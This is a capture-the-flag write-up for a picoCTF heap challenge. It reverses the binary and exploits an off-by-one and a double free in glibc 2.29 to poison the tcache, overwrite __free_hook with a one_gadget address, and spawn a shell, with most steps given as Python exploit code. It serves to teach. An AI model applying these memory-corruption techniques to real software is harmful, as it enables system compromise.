# zero_to_hero 500 points - (pnw, pico, heap exploitation, glibc 2.29, off-by-one, tcache, __free_hook)



### Notes
- I haven't solved this challenge during the competition time, but I haven't even had time to try
- binary given
- glibc 2.29

## Enumeration
As we have no source code we have to start with reverse engineering part. Using Ghidra we can quicly obtain some pseudo code:

```c
// Simplified!

char *slots[6];

void allocate_slot() {
    size_t idx = 0;
    while (idx < 6 && slots[idx])) ++idx;
    if (idx == 6) return;

    size_t size;
    scanf("%d", &size);
    if (size > 0x408) return;

    char* new_slot = malloc(size);
    bytes_read = read(0, new_slot, size);
    new_slot[bytes_read] = 0;

    slots[idx] = new_slot;
}

void remote_slot() {
    size_t idx = getchar();
    id (idx < 6) free(slots[idx]);
}

int main() {
    printf("%p", system);
    while (1) {
        cmd = getchar();
        switch (cmd) {
            case 0:
                allocate_slot();
                break;

            case 1:
                remove_slot();
                break;

            default:
                exit();
        }
    }
}
```

So the code allows us to allocate a slot of max. size 0x408 and to free a slot of our choice.

### Vulnerabilities
We can quicly spot three obvious vulnerabilities.

Libc leak (it was a giveaway). This let's us calculate the `libc_base` address.

```c
printf("%p", system);
```


Double free:

```c
void remote_slot() {
    size_t idx = getchar();
    id (idx < 6) free(slots[idx]);
}
```

Heap-overflow:

```c
void allocate_slot() {
    [...]
    bytes_read = read(0, new_slot, size);
    new_slot[bytes_read] = 0; // overflow by one byte
    [...]
}
```

### Protections
Now let's check what protections we need to bypass:

```gdb
$ checksec zero_to_hero
[*] './zero_to_hero'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```



## Exploit
We have double free, almost no size constraints, heap-overflow by one byte and libc base address!!! Seems super easy! We just need a way to gain control over instruction pointer and call one_gadget.

### Tcache dup?
Can we just gain UAF using [tcache dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c)?

```python
allocate_slot(0x140) # slot 0, chunk 0
remove_slot(0) # Tchunk 0x140 ---> chunk 0
remove_slot(0) # Tchunk 0x140 ----> chunk 0 -----> chunk 0
allocate_slot(0x140) # returns chunk 0, so we can now poison Tchunk 0x140 list 
```

The answer is NO. Unfortunetely for us, glibc-2.29 introducted `key` atribute to detect double frees.

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```

When a chunk is being freed the glibc checks if the chunk already is in tcache. If it is it errors.

```c
// Simplified!

free() {
    [...]
    if (e-key == tcache) {
        malloc_printerr ("free(): double free detected in tcache 2"); 
    }
    [...]
    /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
    e->key = tcache;
    [...]
}

malloc() {
    [...]
    e->key = NULL;
    [...]
}
```

### Fastbin dup
Ok, so we do know we will have a hard time using tcache because of this double free protection. But can we just fill the tcache and then perform a [fastbin dup](https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c)?
Again, the answer if NO, as we have slot limit set to 6 while the tcache buffers are of default size 7.

```c
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
```

Moreover we can only allocate `tcache chunks` as every chunk of size <= 0x410 will be placed in tcache.

### Back to Tcache dup
Before when we tried to duplicate tchunks we haven't used a off-by-one vulnerability. Let's see how can we combine double free with off-by-one to duplicate the tchache chunks!

```python
# We will need two chunks. We will duplicate chunk 1 and use chunk 0 to overwrite chunk's 1 size header. Start will allocating and freeing them.
allocate_slot(0x140, b'') # slot 0, chunk 0
allocate_slot(0x140, b'') # slot 1, chunk 1

remove_slot(1)
remove_slot(0)

# Bins:
# TC 0x140 ---> chunk 0 ---> chunk 1
allocate_slot(0x140, b'A' * 0x140) # slot 3, chunk 0
# When allocating we can set a content which will overflow the chunk 0 size header. The 0x140 will become 0x100, meaning that when freeing chunk 1 again, it will land in tchace 0x100 list and bypass security check.
free_slot(1)

# Bins:
# TC 0x140 ---> chunk 1
# TC 0x100 ---> chunk 1
```

Now we can just [poison the tcache](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c). We will overwrite `__free_hook` with address of our one shot gadget.

```python
# Let's poison 0x100 tcache list by overwriting fd pointer of new slot with &__free_hook address
free_hook_addr = libc_base + FREE_HOOK_OFFSET
allocate_slot(0x140, p64(free_hook_addr)) # slot 4, chunk 1

# Bins:
# TC 0x100 ---> chunk 1 ---> &__free_hook
allocate_slot(0x100, p64(free_hook_addr)) # slot 5, chunk 1

# Bins:
# TC 0x100 ---> &__free_hook
one_gadget_addr = libc_base + 0xe2383
allocate_slot(0x100, p64(one_gadget_addr))
```

Bum, that's all! We have a shell.


## Notes
Having a custom glibc version we can write a test programs by compiling the program with -Wl flags.

```bash
$ ls
$ test.c ld-2.29.so libc.so.6
$ gcc test.c -o test -Wl,-rpath . -Wl,-dynamic-linker,./ld-2.29.so
$ ls
$ test.c test
$ checksec test
[*] './test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
$ ldd test
ldd test
	linux-vdso.so.1 (0x00007ffda41b2000)
	libc.so.6 => ./libc.so.6 (0x00007fbe68b41000)
	./ld-2.29.so => /lib64/ld-linux-x86-64.so.2 (0x00007fbe68b07000)
```

The gdb etc. will work fine with this, no need to set any env variables.